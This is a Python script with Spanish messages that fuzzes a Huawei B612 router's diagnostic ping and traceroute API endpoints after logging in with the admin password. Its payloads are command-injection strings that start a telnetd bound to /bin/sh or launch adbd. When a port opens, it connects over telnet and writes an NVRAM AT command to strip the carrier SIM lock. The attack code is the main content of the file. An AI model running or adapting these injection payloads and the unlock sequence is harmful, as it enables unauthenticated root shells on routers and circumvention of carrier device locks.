import sys
import time
import socket
import argparse
import telnetlib
sys.path.insert(0, r'c:\Users\davis\Desktop\herramienta de desbloque')
from webui_update import Router

def test_port(ip, port, timeout=2):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        s.close()
        return True
    except Exception:
        return False

def unlock_via_telnet(host, port=23):
    print(f"\n[+] Conectando a Telnet en {host}:{port} para anular SIM-Lock...")
    try:
        tn = telnetlib.Telnet(host, port, timeout=5)
        time.sleep(1)
        cmd = "atc at^nvwrex=8268,0,12,1,0,0,0,2,0,0,0,a,0,0,0\n"
        print(f"[+] Enviando comando NVRAM: {cmd.strip()}")
        tn.write(cmd.encode('ascii'))
        time.sleep(1)
        out = tn.read_very_eager().decode('ascii', errors='ignore')
        print(f"[+] Respuesta Telnet: {out}")
        
        print("[+] Enviando reinicio de módem AT^RESET...")
        tn.write(b"atc at^reset\n")
        time.sleep(1)
        tn.close()
        print("🎉🎉🎉 ¡DESBLOQUEO EJECUTADO CON ÉXITO! Reinicia el router y prueba la SIM. 🎉🎉🎉")
        return True
    except Exception as e:
        print(f"[-] Error comunicando por Telnet: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Fuzzer de inyección en endpoints de diagnóstico Huawei B612")
    parser.add_argument("--password", required=True, help="Contraseña WebUI del sticker del router")
    parser.add_argument("--host", default="192.168.8.1", help="IP del router (default: 192.168.8.1)")
    args = parser.parse_args()

    host = args.host
    print("=================================================================")
    print(f"=== FUZZING E INYECCIÓN EN DIAGNÓSTICO PING/TRACEROUTE ({host}) ===")
    print("=================================================================")
    
    r = Router(host)
    if not r.get_session():
        print("[-] No se pudo obtener sesión inicial. ¿Router encendido y conectado por LAN/Wi-Fi?")
        sys.exit(1)
        
    print("[+] Conectado al WebServer. Iniciando autenticación SCRAM-SHA256...")
    if not r.login_scram("admin", args.password):
        print("[-] Login falló: contraseña incorrecta o waittime activo.")
        print("[-] Revisa la etiqueta (sticker) del router ('WebUI password' / 'Password').")
        sys.exit(1)
        
    print("[+] Login SCRAM exitoso. Sesión autenticada en vivo.\n")

    payloads = [
        "127.0.0.1; telnetd -p 23 -l /bin/sh &",
        "127.0.0.1 | telnetd -p 23 -l /bin/sh &",
        "127.0.0.1\n telnetd -p 23 -l /bin/sh &",
        "$(telnetd -p 23 -l /bin/sh &)",
        "`telnetd -p 23 -l /bin/sh &`",
        "127.0.0.1; /bin/busybox telnetd -p 23 &",
        "127.0.0.1; /system/bin/adbd &",
        "127.0.0.1; adbd &",
        "127.0.0.1; atc at^nvwrex=8268,0,12,1,0,0,0,2,0,0,0,a,0,0,0 &"
    ]

    endpoints = [
        "/api/diagnosis/diagnose_ping",
        "/api/diagnosis/diagnose_traceroute",
        "/api/net/ping",
        "/api/net/traceroute",
        "/api/diag/ping",
        "/api/diag/traceroute"
    ]

    for ep in endpoints:
        print(f"\n--- Probando Endpoint: {ep} ---")
        for payload in payloads:
            xml_body = f"""<request>
<Host>{payload}</Host>
<HostName>{payload}</HostName>
<IP>{payload}</IP>
<Dest>{payload}</Dest>
<Url>{payload}</Url>
</request>"""
            print(f"  Payload: {payload!r}")
            st, resp = r.http("POST", ep, body=xml_body.encode(), headers={"_ResponseSource": "Broswer"})
            txt = resp.decode("utf-8", "replace") if isinstance(resp, bytes) else str(resp)
            one_line = " ".join(txt.split())[:110]
            print(f"    Respuesta ({st}): {one_line}")
            
            # Verificar si abrió Telnet (23) o ADB (5555)
            if test_port(host, 23, timeout=1):
                print("\n🎉🎉🎉 ¡¡¡PUERTO TELNET (23) ABIERTO EN EL ROUTER!!! 🎉🎉🎉")
                unlock_via_telnet(host, 23)
                sys.exit(0)
            if test_port(host, 5555, timeout=1):
                print("\n🎉🎉🎉 ¡¡¡PUERTO ADB (5555) ABIERTO EN EL ROUTER!!! 🎉🎉🎉")
                sys.exit(0)
            time.sleep(0.3)
                
    print("\n=================================================================")
    print("=== FIN DEL BARRIDO DE INYECCIÓN ===")
    print("=================================================================")
    print("Diagnóstico:")
    print("• Si los endpoints respondieron '100003', el firmware Entel deshabilitó el módulo de diagnóstico.")
    print("• Si respondieron '100002' / 'error', el router sanitizó los caracteres antes de pasarlos a shell.")
    print("• Los 2 intentos de NCK siguen 100% intactos.")

if __name__ == "__main__":
    main()

